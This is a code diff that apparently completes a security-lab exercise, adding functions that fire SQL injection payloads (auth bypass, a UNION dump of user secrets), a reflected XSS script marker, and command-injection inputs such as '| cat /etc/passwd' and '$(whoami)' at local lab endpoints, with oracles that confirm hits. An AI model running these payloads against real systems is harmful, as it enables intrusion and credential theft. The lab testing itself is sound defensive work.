@@ -18,10 +18,12 @@ to test; see ../../resources/ethics-and-scope.md.
 
 from __future__ import annotations
 
+import json as _json
+
 from seclab.attack import Payload, Finding, run_payloads, contains_oracle
 from seclab.scan import ScanResult
 
-from webharness import (login_send, reflect_send, reflect_safe_send, ping_send,
+from webharness import (get, login_send, reflect_send, reflect_safe_send, ping_send,
                         RULE_ALIASES)
 
 
@@ -50,7 +52,15 @@ def confirm_sqli() -> list[Finding]:
     """
     # TODO: build the payloads (incl. a benign control) and run_payloads with a
     #       canary oracle; return the Findings.
-    raise NotImplementedError
+
+    payloads = [
+        Payload("admin' OR '1'='1", intent="auth-bypass", family="sqli"),
+        Payload("admin'--", intent="comment-out", family="sqli"),
+        Payload("' UNION SELECT user, secret FROM users--", intent="union-dump", family="sqli"),
+        Payload("admin", intent="benign-control", family="benign"),
+    ]
+    
+    return run_payloads(payloads, send=login_send, oracle=contains_oracle("FLAG-sqli-"))
 
 
 def confirm_xss() -> tuple[Finding, Finding]:
@@ -72,7 +82,23 @@ def confirm_xss() -> tuple[Finding, Finding]:
     # TODO: define xss_oracle (unescaped <script> present), pick a marker payload
     #       such as "<script>alert('XSS-FIRED-7f3a')</script>", run it against
     #       reflect_send and reflect_safe_send, and return (vuln_f, safe_f).
-    raise NotImplementedError
+    def xss_oracle(payload, response):
+            # Sound necessary condition for execution: the <script> tag survives
+            # UNescaped. If it came back as &lt;script&gt; (html.escape'd) it cannot
+            # execute -> that is reflection, not XSS, and must NOT confirm.
+            unescaped = "<script>" in response
+            escaped = "&lt;script&gt;" in response
+            hit = unescaped and not escaped
+            return hit, ("unescaped <script> survived in the response" if hit
+                        else "no unescaped <script> (escaped or absent)")
+
+    marker = "<script>alert('XSS-FIRED-7f3a')</script>"
+    payload = [Payload(marker, intent="reflected-xss", family="xss",
+                       note="unescaped <script> in the response = would execute")]
+
+    vuln_f = run_payloads(payload, send=reflect_send, oracle=xss_oracle)[0]
+    safe_f = run_payloads(payload, send=reflect_safe_send, oracle=xss_oracle)[0]
+    return vuln_f, safe_f
 
 
 def confirm_cmdi() -> list[Finding]:
@@ -88,7 +114,25 @@ def confirm_cmdi() -> list[Finding]:
     """
     # TODO: define cmdi_oracle (json injection_detected True), build payloads incl.
     #       a benign control, run_payloads with ping_send, return the Findings.
-    raise NotImplementedError
+    def cmdi_oracle(payload, response):
+        # Sound oracle: a shell metacharacter actually reached the command
+        # context (injection_detected), NOT just that the host was echoed back.
+        try:
+            data = _json.loads(response)
+        except _json.JSONDecodeError:
+            return False, "non-JSON response"
+        hit = data.get("injection_detected") is True
+        return hit, (f"metacharacter reached command: {data.get('would_run')!r}"
+                     if hit else "no shell metacharacter in host")
+
+    payloads = [
+        Payload("127.0.0.1; whoami", intent="chain-with-semicolon", family="cmdi"),
+        Payload("127.0.0.1 && id", intent="chain-with-and", family="cmdi"),
+        Payload("127.0.0.1 | cat /etc/passwd", intent="pipe", family="cmdi"),
+        Payload("$(whoami)", intent="command-substitution", family="cmdi")
+    ]
+
+    return run_payloads(payloads, send=ping_send, oracle=cmdi_oracle)
 
 
 # ============================================================================
